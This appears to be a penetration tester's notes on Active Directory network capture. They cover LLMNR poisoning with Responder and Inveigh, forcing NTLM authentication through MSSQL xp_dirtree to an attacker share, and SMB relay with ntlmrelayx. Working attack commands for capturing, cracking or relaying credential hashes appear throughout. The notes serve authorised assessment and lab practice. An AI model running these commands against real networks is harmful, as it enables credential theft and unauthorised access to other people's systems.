# Network Capture

## Overview

Network capture involves monitoring and analysing network traffic to identify sensitive information transmitted across the environment. During an Active Directory assessment, captured traffic may reveal authentication attempts, service configurations, or credentials that can be leveraged for further access. Network capture is particularly valuable for identifying insecure protocols and understanding communication patterns that may expose additional attack opportunities.

---
LLMNR Poisoning
---
With port enumeration failed we can use responder to obtain NTLM hashes

```
responder -I tun0 -A
```

Normally we would wait for an actual response or if we have upload functionality on smb then set up responder and use ntlm_theft.py (Vault).

Next step could be to crack the hashes or use SMB Relay or Pass-the-Hash

For Windows
---
[https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

```
Import-Module .\Inveigh.ps1
```
```
(Get-Command Invoke-Inveigh).Parameters
```

Receive requests
```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

If we already logged into MSSQL, WinRM
This uses xp_dirtree and Responder

Responder cannot be used for spoofing, use -A
```
responder -I tun0 -A -v
```

```
xp_dirtree \\[target IP]\[share]
```

Now check responder for hash
Crack the hash 

Working example in Escape 


SMB Relay
---

If SMB signing is not required we can try to do an SMB relay attack.

- Instead of cracking the hash we relay it to machines to gain access
- Relayed hash must be for admin on that machine
- We can use this attack once have a hash (LLMNR Poisoning maybe)

```
Ntlmrelayx.py
```


We can obtain SAM hashes for local users or obtain a shell
https://www.youtube.com/watch?v=VXxH4n684HE&t=11432s
